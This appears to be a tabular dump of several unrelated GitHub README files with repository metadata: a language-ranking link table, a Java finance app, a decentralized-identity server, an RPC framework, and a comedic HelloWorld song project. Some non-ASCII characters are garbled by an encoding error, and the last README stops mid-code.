            <td align=""center""><a href=""content/charts/growth/software/CSHARP.md"">C#</a></td> 
            <td align=""center""><a href=""content/charts/growth/knowledge/CSHARP.md"">C#</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/software/CSHARP.md"">C#</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/knowledge/CSHARP.md"">C#</a></td> 
        </tr>
        <tr>
            <td align=""center""><a href=""content/charts/overall/software/PHP.md"">PHP</a></td> 
            <td align=""center""><a href=""content/charts/overall/knowledge/PHP.md"">PHP</a></td> 
            <td align=""center""><a href=""content/charts/growth/software/PHP.md"">PHP</a></td> 
            <td align=""center""><a href=""content/charts/growth/knowledge/PHP.md"">PHP</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/software/PHP.md"">PHP</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/knowledge/PHP.md"">PHP</a></td> 
        </tr>
        <tr>
            <td align=""center""><a href=""content/charts/overall/software/HTML.md"">HTML</a></td> 
            <td align=""center""><a href=""content/charts/overall/knowledge/HTML.md"">HTML</a></td> 
            <td align=""center""><a href=""content/charts/growth/software/HTML.md"">HTML</a></td> 
            <td align=""center""><a href=""content/charts/growth/knowledge/HTML.md"">HTML</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/software/HTML.md"">HTML</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/knowledge/HTML.md"">HTML</a></td> 
        </tr>
        <tr>
            <td align=""center""><a href=""content/charts/overall/software/Swift.md"">Swift</a></td> 
            <td align=""center""><a href=""content/charts/overall/knowledge/Swift.md"">Swift</a></td> 
            <td align=""center""><a href=""content/charts/growth/software/Swift.md"">Swift</a></td> 
            <td align=""center""><a href=""content/charts/growth/knowledge/Swift.md"">Swift</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/software/Swift.md"">Swift</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/knowledge/Swift.md"">Swift</a></td> 
        </tr>
        <tr>
            <td align=""center""><a href=""content/charts/overall/software/Kotlin.md"">Kotlin</a></td> 
            <td align=""center""><a href=""content/charts/overall/knowledge/Kotlin.md"">Kotlin</a></td> 
            <td align=""center""><a href=""content/charts/growth/software/Kotlin.md"">Kotlin</a></td> 
            <td align=""center""><a href=""content/charts/growth/knowledge/Kotlin.md"">Kotlin</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/software/Kotlin.md"">Kotlin</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/knowledge/Kotlin.md"">Kotlin</a></td> 
        </tr>
        <tr>
            <td align=""center""><a href=""content/charts/overall/software/Objective-C.md"">Objective-C</a></td> 
            <td align=""center""><a href=""content/charts/overall/knowledge/Objective-C.md"">Objective-C</a></td> 
            <td align=""center""><a href=""content/charts/growth/software/Objective-C.md"">Objective-C</a></td> 
            <td align=""center""><a href=""content/charts/growth/knowledge/Objective-C.md"">Objective-C</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/software/Objective-C.md"">Objective-C</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/knowledge/Objective-C.md"">Objective-C</a></td> 
        </tr>
        <tr>
            <td align=""center""><a href=""content/charts/overall/software/CSS.md"">CSS</a></td> 
            <td align=""center""><a href=""content/charts/overall/knowledge/CSS.md"">CSS</a></td> 
            <td align=""center""><a href=""content/charts/growth/software/CSS.md"">CSS</a></td> 
            <td align=""center""><a href=""content/charts/growth/knowledge/CSS.md"">CSS</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/software/CSS.md"">CSS</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/knowledge/CSS.md"">CSS</a></td> 
        </tr>
        <tr>
            <td align=""center""><a href=""content/charts/overall/software/Shell.md"">Shell</a></td> 
            <td align=""center""><a href=""content/charts/overall/knowledge/Shell.md"">Shell</a></td> 
            <td align=""center""><a href=""content/charts/growth/software/Shell.md"">Shell</a></td> 
            <td align=""center""><a href=""content/charts/growth/knowledge/Shell.md"">Shell</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/software/Shell.md"">Shell</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/knowledge/Shell.md"">Shell</a></td> 
        </tr>
        <tr>
            <td align=""center""><a href=""content/charts/overall/software/Dart.md"">Dart</a></td> 
            <td align=""center""><a href=""content/charts/overall/knowledge/Dart.md"">Dart</a></td> 
            <td align=""center""><a href=""content/charts/growth/software/Dart.md"">Dart</a></td> 
            <td align=""center""><a href=""content/charts/growth/knowledge/Dart.md"">Dart</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/software/Dart.md"">Dart</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/knowledge/Dart.md"">Dart</a></td> 
        </tr>
        <tr>
            <td align=""center""><a href=""content/charts/overall/software/Rust.md"">Rust</a></td> 
            <td align=""center""><a href=""content/charts/overall/knowledge/Rust.md"">Rust</a></td> 
            <td align=""center""><a href=""content/charts/growth/software/Rust.md"">Rust</a></td> 
            <td align=""center""><a href=""content/charts/growth/knowledge/Rust.md"">Rust</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/software/Rust.md"">Rust</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/knowledge/Rust.md"">Rust</a></td> 
        </tr>
        <tr>
            <td align=""center""><a href=""content/charts/overall/software/Jupyter-Notebook.md"">Jupyter Notebook</a></td> 
            <td align=""center""><a href=""content/charts/overall/knowledge/Jupyter-Notebook.md"">Jupyter Notebook</a></td> 
            <td align=""center""><a href=""content/charts/growth/software/Jupyter-Notebook.md"">Jupyter Notebook</a></td> 
            <td align=""center""><a href=""content/charts/growth/knowledge/Jupyter-Notebook.md"">Jupyter Notebook</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/software/Jupyter-Notebook.md"">Jupyter Notebook</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/knowledge/Jupyter-Notebook.md"">Jupyter Notebook</a></td> 
        </tr>
        <tr>
            <td align=""center""><a href=""content/charts/overall/software/Assembly.md"">Assembly</a></td> 
            <td align=""center""><a href=""content/charts/overall/knowledge/Assembly.md"">Assembly</a></td> 
            <td align=""center""><a href=""content/charts/growth/software/Assembly.md"">Assembly</a></td> 
            <td align=""center""><a href=""content/charts/growth/knowledge/Assembly.md"">Assembly</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/software/Assembly.md"">Assembly</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/knowledge/Assembly.md"">Assembly</a></td> 
        </tr>
        <tr>
            <td align=""center""><a href=""content/charts/overall/software/Vim-script.md"">Vim script</a></td> 
            <td align=""center""><a href=""content/charts/overall/knowledge/Vim-script.md"">Vim script</a></td> 
            <td align=""center""><a href=""content/charts/growth/software/Vim-script.md"">Vim script</a></td> 
            <td align=""center""><a href=""content/charts/growth/knowledge/Vim-script.md"">Vim script</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/software/Vim-script.md"">Vim script</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/knowledge/Vim-script.md"">Vim script</a></td> 
        </tr>
        <tr>
            <td align=""center""><a href=""content/charts/overall/software/Ruby.md"">Ruby</a></td> 
            <td align=""center""><a href=""content/charts/overall/knowledge/Ruby.md"">Ruby</a></td> 
            <td align=""center""><a href=""content/charts/growth/software/Ruby.md"">Ruby</a></td> 
            <td align=""center""><a href=""content/charts/growth/knowledge/Ruby.md"">Ruby</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/software/Ruby.md"">Ruby</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/knowledge/Ruby.md"">Ruby</a></td> 
        </tr>
        <tr>
            <td align=""center""><a href=""content/charts/overall/software/Lua.md"">Lua</a></td> 
            <td align=""center""><a href=""content/charts/overall/knowledge/Lua.md"">Lua</a></td> 
            <td align=""center""><a href=""content/charts/growth/software/Lua.md"">Lua</a></td> 
            <td align=""center""><a href=""content/charts/growth/knowledge/Lua.md"">Lua</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/software/Lua.md"">Lua</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/knowledge/Lua.md"">Lua</a></td> 
        </tr>
        <tr>
            <td align=""center""><a href=""content/charts/overall/software/TeX.md"">TeX</a></td> 
            <td align=""center""><a href=""content/charts/overall/knowledge/TeX.md"">TeX</a></td> 
            <td align=""center""><a href=""content/charts/growth/software/TeX.md"">TeX</a></td> 
            <td align=""center""><a href=""content/charts/growth/knowledge/TeX.md"">TeX</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/software/TeX.md"">TeX</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/knowledge/TeX.md"">TeX</a></td> 
        </tr>
        <tr>
            <td align=""center""><a href=""content/charts/overall/software/Groovy.md"">Groovy</a></td> 
            <td align=""center""><a href=""content/charts/overall/knowledge/Groovy.md"">Groovy</a></td> 
            <td align=""center""><a href=""content/charts/growth/software/Groovy.md"">Groovy</a></td> 
            <td align=""center""><a href=""content/charts/growth/knowledge/Groovy.md"">Groovy</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/software/Groovy.md"">Groovy</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/knowledge/Groovy.md"">Groovy</a></td> 
        </tr>
        <tr>
            <td align=""center""><a href=""content/charts/overall/software/Perl.md"">Perl</a></td> 
            <td align=""center""><a href=""content/charts/overall/knowledge/Perl.md"">Perl</a></td> 
            <td align=""center""><a href=""content/charts/growth/software/Perl.md"">Perl</a></td> 
            <td align=""center""><a href=""content/charts/growth/knowledge/Perl.md"">Perl</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/software/Perl.md"">Perl</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/knowledge/Perl.md"">Perl</a></td> 
        </tr>
        <tr>
            <td align=""center""><a href=""content/charts/overall/software/MATLAB.md"">MATLAB</a></td> 
            <td align=""center""><a href=""content/charts/overall/knowledge/MATLAB.md"">MATLAB</a></td> 
            <td align=""center""><a href=""content/charts/growth/software/MATLAB.md"">MATLAB</a></td> 
            <td align=""center""><a href=""content/charts/growth/knowledge/MATLAB.md"">MATLAB</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/software/MATLAB.md"">MATLAB</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/knowledge/MATLAB.md"">MATLAB</a></td>
        </tr>
        <tr>
            <td align=""center""><a href=""content/charts/overall/software/Pascal.md"">Pascal</a></td> 
            <td align=""center""><a href=""content/charts/overall/knowledge/Pascal.md"">Pascal</a></td> 
            <td align=""center""><a href=""content/charts/growth/software/Pascal.md"">Pascal</a></td> 
            <td align=""center""><a href=""content/charts/growth/knowledge/Pascal.md"">Pascal</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/software/Pascal.md"">Pascal</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/knowledge/Pascal.md"">Pascal</a></td> 
        </tr>
        <tr>
            <td align=""center""><a href=""content/charts/overall/software/R.md"">R</a></td> 
            <td align=""center""><a href=""content/charts/overall/knowledge/R.md"">R</a></td> 
            <td align=""center""><a href=""content/charts/growth/software/R.md"">R</a></td> 
            <td align=""center""><a href=""content/charts/growth/knowledge/R.md"">R</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/software/R.md"">R</a></td> 
            <td align=""center""><a href=""content/charts/new_repo/knowledge/R.md"">R</a></td> 
        </tr>
    </table>
</div>

<div align=""center"">
    <p><sub>‚Üì -- ÊÑüË∞¢ËØªËÄÖ -- ‚Üì</sub></p>
    Ê¶úÂçïÊåÅÁª≠Êõ¥Êñ∞ÔºåÂ¶ÇÊúâÂ∏ÆÂä©ËØ∑Âä†ÊòüÊî∂ËóèÔºåÊñπ‰æøÂêéÁª≠ÊµèËßàÔºåÊÑüË∞¢‰Ω†ÁöÑÊîØÊåÅÔºÅ
</div>
",0,0,1,NOASSERTION,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
owenwijaya22/PennyWise,master,"# PennyWise - Personal Finance Management System

The project emerged from recognizing several key challenges:

1. Financial Literacy Gap

- Many individuals struggle with basic budgeting and expense tracking
- Limited understanding of spending patterns and financial habits
- Need for a simple yet comprehensive tool to learn financial management

2. Student-Specific Needs

- Integration of student/staff discount systems
- Managing limited income effectively
- Balancing academic expenses with daily needs

3. Digital Solution Requirements

- Need for offline accessibility (local file storage)
- Data privacy concerns with cloud-based solutions
- Desire for a lightweight, no-subscription alternative to commercial apps

## Features

- üë§ User Authentication
  - Register new users
  - Login/logout functionality
  - Account management

- üì¶ Data Storage
  - Save user data to a local file
  - Load user data from a local file
  - Data persistence across sessions
- üí∞ Transaction Management
  - Add income and expense transactions
  - Integrate with student/staff discount deals, or customize your own!
  - Categorize transactions
  - View transaction history
- üìä Budget Planning
  - Set monthly budgets
  - Update existing budgets
  - Budget limit warnings
- üìà Financial Analysis
  - Calculate total income
  - Track monthly expenses/income, as well as by category
  - Monitor current balance
  - Analyze spending patterns

## Getting Started

### Prerequisites (if you don't have Eclipse)

- **Java SE Development Kit 21 or higher**
  - Download here: [Java SE Runtime Environment](http://www.oracle.com/technetwork/java/javase/downloads/index.html) (recommended version 21)
  - Ensure your JDK is installed and added to the PATH environment variables:
    1. Right-click on My Computer and select Properties.
    2. On the Advanced tab, select Environment Variables.
    3. Edit the PATH variable to point to the location of the Java Runtime Environment (JRE).
       - Example: `C:\Program Files\Java\jdk-21\bin`
    - [Environment Variable Setup Preview](https://imgur.com/a/SyW6GX6)

### Running the Application

#### With Eclipse

1. Open the terminal inside Eclipse (CTRL + ALT + T) and navigate to the `Release/` directory.
2. Run the `PennyWise.jar` file using the command:
   `java -jar PennyWise.jar`
3. [Running Preview with Eclipse](https://imgur.com/a/OiWP5ky)
4. Register, login, and start managing your finances!

#### With JDK 21

- Open the terminal and cd into the Release/ directory
- Run the PennyWise.jar file using the command `java -jar PennyWise.jar`
- [Running Preview with JDK 21](https://imgur.com/a/j7lVg5c)
- Register, login, and start managing your finances!

`
## Documentation

1. Check the basic documentation at ./PennyWise/doc/index.html
2. Source code files are also annotated with JAutoDoc comments
3. Test files are manually annotated

<div style=""page-break-before: always;"" />

## Project Structure

```
PennyWise/
‚îú‚îÄ‚îÄ bin/ # Compiled bytecode
‚îú‚îÄ‚îÄ doc/ # JavaDoc documentation
‚îú‚îÄ‚îÄ pennywise_data/ # Runtime generated data files, the program has a failsafe system to automatically create the dir if it doesn't exist.
‚îú‚îÄ‚îÄ test_data/ # Data files for JUnit tests
‚îú‚îÄ‚îÄ release/ # Release .jar binary
‚îú‚îÄ‚îÄ src/pennywise/ # Source code inside pennywise package
‚îÇ ‚îú‚îÄ‚îÄ interfaces/
‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ IDataStorage.java
‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ TransactionCategory.java
‚îÇ ‚îú‚îÄ‚îÄ model/
‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ Budget.java
‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ Discount.java
‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ ExpenseCategory.java
‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ IncomeCategory.java
‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ Transaction.java
‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ User.java
‚îÇ ‚îú‚îÄ‚îÄ service/
‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ AuthenticationService.java
‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ BudgetManager.java
‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ TransactionAnalyzer.java
‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ TransactionManager.java
‚îÇ ‚îú‚îÄ‚îÄ storage/
‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ FileDataStorage.java
‚îÇ ‚îú‚îÄ‚îÄ ui/
‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ handlers/
‚îÇ ‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ AccountHandler.java
‚îÇ ‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ BudgetHandler.java
‚îÇ ‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ DiscountHandler.java
‚îÇ ‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ Handler.java
‚îÇ ‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ MenuHandler.java
‚îÇ ‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ TransactionHandler.java
‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ ConsoleUI.java
‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ UIConstants.java
‚îÇ ‚îú‚îÄ‚îÄ utils/
‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ DiscountManager.java
‚îÇ ‚îî‚îÄ‚îÄ PennyWise.java
‚îú‚îÄ‚îÄ src/test/ # All the relevant tests are included in the dir
‚îÇ ‚îî‚îÄ‚îÄ pennywise/
‚îÇ ‚îú‚îÄ‚îÄ model/
‚îÇ ‚îú‚îÄ‚îÄ service/
‚îÇ ‚îú‚îÄ‚îÄ storage/
‚îÇ ‚îú‚îÄ‚îÄ stubs/
‚îÇ ‚îú‚îÄ‚îÄ ui-handlers/****
‚îÇ ‚îî‚îÄ‚îÄ PennyWiseTest.java
```
",0,0,2,,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,149.0
OmniOneID/did-ta-server,develop,"TAS(Trust Agent Service) Server
==

Welcome to the TAS Server Repository. <br>
This repository contains the source code, documentation, and related resources for the TAS Server.

## Folder Structure
Overview of the major folders and documents in the project directory:

```
did-ta-server
‚îú‚îÄ‚îÄ CHANGELOG.md
‚îú‚îÄ‚îÄ CLA.md
‚îú‚îÄ‚îÄ CODE_OF_CONDUCT.md
‚îú‚îÄ‚îÄ CONTRIBUTING.md
‚îú‚îÄ‚îÄ LICENSE
‚îú‚îÄ‚îÄ dependencies-license.md
‚îú‚îÄ‚îÄ MAINTAINERS.md
‚îú‚îÄ‚îÄ README.md
‚îú‚îÄ‚îÄ RELEASE-PROCESS.md
‚îú‚îÄ‚îÄ SECURITY.md
‚îú‚îÄ‚îÄ docs
‚îÇ¬†¬† ‚îî‚îÄ‚îÄ api
‚îÇ¬†¬†     ‚îî‚îÄ‚îÄ TAS_API_ko.md
‚îÇ¬†¬† ‚îî‚îÄ‚îÄ errorCode
‚îÇ¬†¬†     ‚îî‚îÄ‚îÄ TAS_ErrorCode.md
‚îÇ¬†¬† ‚îî‚îÄ‚îÄ installation
‚îÇ¬†¬†     ‚îî‚îÄ‚îÄ OpenDID_TASServer_InstallationAndOperation_Guide.md
‚îÇ¬†¬† ‚îî‚îÄ‚îÄ db
‚îÇ¬†¬†     ‚îî‚îÄ‚îÄ OpenDID_TableDefinition_TAS.md
‚îî‚îÄ‚îÄ source
    ‚îî‚îÄ‚îÄ did-ta-server
        ‚îú‚îÄ‚îÄ gradle
        ‚îú‚îÄ‚îÄ libs
            ‚îî‚îÄ‚îÄ did-sdk-common-1.0.0.jar
            ‚îî‚îÄ‚îÄ did-blockchain-sdk-server-1.0.0.jar
            ‚îî‚îÄ‚îÄ did-core-sdk-server-1.0.0.jar
            ‚îî‚îÄ‚îÄ did-crypto-sdk-server-1.0.0.jar
            ‚îî‚îÄ‚îÄ did-datamodel-sdk-server-1.0.0.jar
            ‚îî‚îÄ‚îÄ did-wallet-sdk-server-1.0.0.jar
        ‚îú‚îÄ‚îÄ sample
        ‚îî‚îÄ‚îÄ src
        ‚îî‚îÄ‚îÄ build.gradle
        ‚îî‚îÄ‚îÄ README.md
        ‚îî‚îÄ‚îÄ README_ko.md
```

<br/>

Below is a description of each folder and file in the directory:

| Name                             | Description                                     |
| -------------------------------- | ----------------------------------------------- |
| CHANGELOG.md                     | Version-specific changes in the project         |
| CODE_OF_CONDUCT.md               | Code of conduct for contributors                |
| CONTRIBUTING.md                  | Contribution guidelines and procedures          |
| LICENSE                          | License                                         |
| dependencies-license.md          | Licenses for the project‚Äôs dependency libraries |
| MAINTAINERS.md                   | Guidelines for project maintainers              |
| RELEASE-PROCESS.md               | Procedures for releasing new versions           |
| SECURITY.md                      | Security policies and vulnerability reporting   |
| docs                             | Documentation                                   |
| ‚îñ api                            | API guide documentation                         |
| ‚îñ errorCode                      | Error codes and troubleshooting guides          |
| ‚îñ installation                   | Installation and setup instructions             |
| ‚îñ db                             | Database ERD,  Table Specifications             |
| source                           | Server source code project                      |
| ‚îñ did-ta-server                  | TAS Server source code and build files          |
| &nbsp;&nbsp;&nbsp;‚îñ gradle       | Gradle build configurations and scripts         |
| &nbsp;&nbsp;&nbsp;‚îñ libs         | External libraries and dependencies             |
| &nbsp;&nbsp;&nbsp;‚îñ sample       | Sample files                                    |
| &nbsp;&nbsp;&nbsp;‚îñ src          | Main source code directory                      |
| &nbsp;&nbsp;&nbsp;‚îñ build.gradle | Gradle build configuration file                 |
| &nbsp;&nbsp;&nbsp;‚îñ README.md    | Overview and instructions for the source code   |

<br/>


## Libraries

Libraries used in this project are organized into two main categories:

1. **Open DID Libraries**: These libraries are developed by the Open DID project and are available in the [libs folder](source/did-ta-server/libs). They include:

   - `did-sdk-common-1.0.0.jar`
   - `did-blockchain-sdk-server-1.0.0.jar`
   - `did-core-sdk-server-1.0.0.jar`
   - `did-crypto-sdk-server-1.0.0.jar`
   - `did-datamodel-sdk-server-1.0.0.jar`
   - `did-wallet-sdk-server-1.0.0.jar`

2. **Third-Party Libraries**: These libraries are open-source dependencies managed via the [build.gradle](source/did-ta-server/build.gradle) file. For a detailed list of third-party libraries and their licenses, please refer to the [dependencies-license.md](dependencies-license.md) file.

## Installation And Operation Guide

For detailed instructions on installing and configuring the TA Server, please refer to the guide below:
- [OpenDID TAS Server Installation and Operation Guide](docs/installation/OpenDID_TASServer_InstallationAndOperation_Guide.md)  

## API Reference

- **TAS API**: Detailed reference for the TAS Server's API endpoints and usage.
  - [TAS API Reference](docs/api/TAS_API_ko.md)

## Change Log

The Change Log provides a detailed record of version-specific changes and updates. You can find it here:
- [Change Log](./CHANGELOG.md)  

## OpenDID Demonstration Videos <br>
To watch our demonstration videos of the OpenDID system in action, please visit our [Demo Repository](https://github.com/OmniOneID/did-demo-server). <br>

These videos showcase key features including user registration, VC issuance, and VP submission processes.

## Contributing

Please read [CONTRIBUTING.md](CONTRIBUTING.md) and [CODE_OF_CONDUCT.md](CODE_OF_CONDUCT.md) for details on our code of conduct, and the process for submitting pull requests to us.

## License
[Apache 2.0](LICENSE)
",1,0,2,Apache-2.0,3,13.0,1.0,3.0,1.0,16.0,0.0,-4.75,38.0
HeZephyr/RPC-Java,main,"# RPC Project

This repository contains a custom-built RPC (Remote Procedure Call) framework in Java, divided into four versions. Each version progressively introduces new features such as caching, load balancing, retry mechanisms, rate limiting, and circuit breaking.

## Project Structure

The project is organized into four main versions (`v1`, `v2`, `v3`, `v4`), with each version implementing an enhanced set of features for the RPC framework. The core components of the framework include `Client`, `Server`, `Service Discovery`, `Load Balancer`, `Retry Mechanism`, `Rate Limiter`, and `Circuit Breaker`.

### Version Overview

- **v1**: Basic RPC framework with Netty for networking and Zookeeper for service discovery.
- **v2**: Introduces local caching of service addresses and custom serializers.
- **v3**: Adds load balancing algorithms and timeout retry mechanisms.
- **v4**: Implements rate limiting using the token bucket algorithm and circuit breaking for resilience.

## Architecture

The project is structured with separate packages for `client`, `server`, `discovery`, `common`, `netty`, and `ratelimit` functionalities. Each version builds upon the previous one by adding new components and features.

The architecture of this RPC framework is illustrated in the diagram below:
![image-20241106134021554](https://raw.githubusercontent.com/HeZephyr/NewPicGoLibrary/main/img/image-20241106134021554.png)


1. **Client**:
    - The client interacts with a **ClientProxy** object, which abstracts the RPC call.
    - The **Circuit Breaker** monitors request health, allowing or denying requests based on the failure rate.
    - The **Load Balancer** selects an appropriate server instance from a **Local Cache of Service Node Addresses**, which is populated through Zookeeper.
    - Requests are serialized and transmitted over TCP using **Netty**.
    - If a request times out, the **Retry Mechanism** attempts to resend it.

2. **Zookeeper**:
    - Acts as a **Service Registry** to facilitate service discovery and maintain a **Whitelist** for authorized services.

3. **Server**:
    - Registers itself with **Zookeeper** upon startup.
    - Incoming requests go through a **Rate Limiter** to prevent overload.
    - Requests are handled by **Netty** for decoding and deserialization.
    - The server processes the request and sends back the response via Netty.

## Features by Version

### v1 - Basic RPC

- **Components**:
    - `ClientProxy` for handling client-side requests.
    - Basic `RpcRequest` and `RpcResponse` message types.
    - `ServiceProvider` on the server for registering services.
    - Netty-based networking for serialization and deserialization.
    - Zookeeper for basic service discovery.

### v2 - Cache and Serialization

- **New Components**:
    - **ServiceCache**: Local cache to store discovered services.
    - **Serializers**: `JsonSerializer`, `ObjectSerializer`, and `ProtoBufSerializer` for message serialization.
    - `ZKServiceDiscovery` and `ZKWatcher` to monitor Zookeeper nodes for service updates.

### v3 - Load Balancing and Retry Mechanism

- **New Features**:
    - **Load Balancers**: Implements Consistent Hash, Random, and Round Robin load balancing strategies.
    - **Retry Mechanism**: Retry failed requests with configurable strategies (fixed wait, limited attempts).
    - **GuavaRetry**: Manages retries in case of network issues or server failures.

### v4 - Rate Limiting and Circuit Breaking

- **New Components**:
    - **Rate Limiter**: Uses a token bucket algorithm to limit request rates.
    - **Circuit Breaker**: Handles fault tolerance with states (OPEN, CLOSED, HALF-OPEN) based on failure thresholds.
    - **CircuitBreakerProvider**: Manages the circuit breaker for each client-service interaction.

## Package Structure

The main components are organized as follows:

```plaintext
rpc/
‚îú‚îÄ‚îÄ v1
‚îÇ   ‚îú‚îÄ‚îÄ basic
‚îÇ   ‚îú‚îÄ‚îÄ netty
‚îÇ   ‚îî‚îÄ‚îÄ zookeeper
‚îú‚îÄ‚îÄ v2
‚îÇ   ‚îú‚îÄ‚îÄ cache
‚îÇ   ‚îî‚îÄ‚îÄ custom
‚îú‚îÄ‚îÄ v3
‚îÇ   ‚îú‚îÄ‚îÄ balancing
‚îÇ   ‚îî‚îÄ‚îÄ timeout
‚îî‚îÄ‚îÄ v4
    ‚îú‚îÄ‚îÄ circuitbreaker
    ‚îî‚îÄ‚îÄ limiter
```
Each version contains client, server, discovery, common, and netty packages to encapsulate respective functionalities.
",0,0,2,MIT,0,5.0,0.0,0.0,0.0,0.0,0.0,1.0,18.0
NanowarOfSteel/HelloWorld,master,"# HelloWorld.java

![thumbnail](./Thumbnail.jpeg)

Welcome to the **Nanowar Of Steel**'s first GitHub project, and first ever example of a **source-code song**.
The aim of this project is to support and enforce ""_True metal programming_"", that basically means: ""_write code so badly that only you can sing it_"".

You can find the source-code video in the link below:
https://www.youtube.com/watch?v=yup8gIXxWDU

[Here](https://nanowar.it/) is the Nanowar Of Steel official website.

[Here](https://www.youtube.com/@nanowarVEVO) is the Nanowar Of Steel Youtube Channel.

Some important notes:
1. Beware of ```Joey De Caio```, if set to null it may suddenly cancel the program execution with a NullPointerException.
2. ```metal``` variable is very important! If it is set to ""false"", it may trigger the Joey De Caio variable mentioned above.
3. ```tizio``` and ```foo``` are very close friends.
4. ```pippo``` isn't ```tizio```'s friend, but he's been flirting with ```foo```.
5. In the comments ""**manage**"" should be renamed as ""**handle**"" (we all wish ""manage"" was the right word, but it's not).
6. The constructor argument is used to control the number of executions. However, it may be completely useless if the execution is cancelled by ```Joey De Caio```.
7. ""_Write once, run anywhere_"" means literally anywhere (e.g. Hellfest).
8. ```songRefrain()``` identifies itself as a void method.

Below you will find a super detailed guide to the program, of course written with ChatGPT.

---

# HelloWorldMainLauncherClass

This project contains a simple Java application that demonstrates the basic usage of loops, conditionals, and handling null-pointer exceptions. The main functionality includes printing ""Hello World!"" multiple times based on a user-defined parameter and intentionally introducing a bug to highlight error handling.

## Overview

The `HelloWorldMainLauncherClass` performs the following tasks:

1. **Initialization**: Accepts an integer parameter (`foo`) that controls how many times ""Hello World!"" will be printed.
2. **Song Refrain**: Prints ""Hello World!"" twice‚Äîfirst using a `for` loop and then using a `while` loop.
3. **Exception Handling**: Contains a method `falseMethod()` that introduces a `NullPointerException` by calling `length()` on a `null` string to simulate error handling.

## Features

- **Hello World printing**: Outputs the message ""Hello World!"" a number of times based on the provided parameter.
- **Loops**: Demonstrates basic usage of `for` and `while` loops in Java.
- **Exception simulation**: Introduces a `NullPointerException` for demonstration purposes.
- **Basic Java structure**: Showcases constructor usage, instance variables, and method definitions.

## Prerequisites

- Java Development Kit (JDK) 21 or higher.
- A Java IDE (like IntelliJ IDEA, Eclipse, or NetBeans) or a command-line environment to compile and run the Java program.

## Installation

To set up and run this project locally, follow these steps:

1. Clone the repository:

   ```bash
   git clone https://github.com/NanowarOfSteel/HelloWorld.git
   ```

2. Navigate into the project sources directory:

   ```bash
   cd HelloWorld
   ```

3. Compile and run the Java file:

   ```bash
   java src/main/java/it/nanowar/ofsteel/helloworld/HelloWorldMainLauncherClass.java
   ```

## Usage

Once you run the program, you will see the following output:

```text
Hello World Programmer Start
Hello World!
Hello World!
Hello World!
Hello World!
Program Finished!
Exception in thread ""main"" java.lang.NullPointerException: Cannot invoke ""String.length()"" because ""joeyDeCaio"" is null
    at HelloWorldMainLauncherClass.falseMethod(HelloWorldMainLauncherClass.java:35)
    at HelloWorldMainLauncherClass.main(HelloWorldMainLauncherClass.java:27)
```

### Configuration

The number of times ""Hello World!"" is printed can be controlled by changing the parameter passed to the constructor of `HelloWorldMainLauncherClass`. For example:

```java
HelloWorldMainLauncherClass tizio = new HelloWorldMainLauncherClass(3);
```

This will print ""Hello World!"" six times.

## Code Explanation

1. **Constructor**: The constructor takes an integer `foo` that determines how many times the message will be printed.
   ```java
   public HelloWorldMainLauncherClass(int foo) {
       super();
       this.foo = foo;
   }
   ```

2. **songRefrain() Method**: The method contains two loops‚Äî`for` and `while`‚Äîboth of which print ""Hello World!"" the number of times specified by `foo`.
   ```java
   public void songRefrain() {
